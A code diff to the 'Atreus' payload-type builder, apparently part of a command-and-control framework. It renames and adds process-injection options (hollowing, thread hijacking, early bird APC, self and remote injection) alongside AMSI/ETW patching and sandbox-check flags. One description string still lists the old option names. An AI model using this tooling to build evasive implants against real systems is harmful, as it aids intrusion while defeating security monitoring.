@@ -59,7 +59,7 @@ class Atreus(PayloadType):
         BuildParameter(
             name="target_process",
             parameter_type=BuildParameterType.String,
-            description="Target process: full path for early_bird/hollow/thread_hijack (e.g. C:\\Windows\\System32\\notepad.exe), process name for remote_thread (e.g. svchost.exe)",
+            description="Target process: full path for early_bird/hollow/thread_hijacking (e.g. C:\\Windows\\System32\\notepad.exe), process name for remote_thread (e.g. svchost.exe)",
             default_value="C:\\Windows\\System32\\notepad.exe",
         ),
         BuildParameter(
@@ -96,7 +96,7 @@ class Atreus(PayloadType):
             name="injection_technique",
             parameter_type=BuildParameterType.ChooseOne,
             description="Injection technique: Early Bird APC (new suspended process), Thread Hijack (RIP redirect), Process Hollowing (unmap + RIP), or Remote Thread (NtCreateThreadEx in existing process - target_process must be a process name like svchost.exe)",
-            choices=["early_bird_apc", "thread_hijack", "hollow", "remote_thread"],
+            choices=["self_injection", "remote_injection", "thread_hijacking", "early_bird_apc", "process_hollowing"],
             default_value="early_bird_apc",
         ),
         BuildParameter(
@@ -188,12 +188,14 @@ class Atreus(PayloadType):
             defines.append("-DUSE_AMSI_PATCH")
         if use_sandbox:
             defines.append("-DUSE_SANDBOX_CHECK")
-        if injection_technique == "thread_hijack":
+        if injection_technique == "thread_hijacking":
             defines.append("-DUSE_THREAD_HIJACK")
-        elif injection_technique == "hollow":
+        elif injection_technique == "process_hollowing":
             defines.append("-DUSE_HOLLOW")
-        elif injection_technique == "remote_thread":
+        elif injection_technique == "remote_injection":
             defines.append("-DUSE_REMOTE_THREAD")
+        elif injection_technique == "self_injection":
+            defines.append("-DUSE_SELF_INJECT")
         if wipe_memory:
             defines.append("-DUSE_WIPE")
 
@@ -241,10 +243,11 @@ class Atreus(PayloadType):
                 if use_etw_patch:    features.append("ETW-patch")
                 if use_amsi_patch:   features.append("AMSI-patch")
                 if use_sandbox:      features.append("sandbox-check")
-                if injection_technique == "thread_hijack":    features.append("thread-hijack")
-                elif injection_technique == "hollow":          features.append("process-hollow")
-                elif injection_technique == "remote_thread":   features.append("remote-thread")
-                else:                                          features.append("early-bird-APC")
+                if injection_technique == "thread_hijacking":    features.append("thread-hijacking")
+                elif injection_technique == "process_hollowing": features.append("process-hollowing")
+                elif injection_technique == "remote_injection":  features.append("remote-injection")
+                elif injection_technique == "self_injection":    features.append("self-injection")
+                else:                                            features.append("early-bird-apc")
                 if wipe_memory:      features.append("wipe")
                 if debug_mode:       features.append("DEBUG")
                 resp.message = f"Atreus [{', '.join(features)}] -> {target_process}"
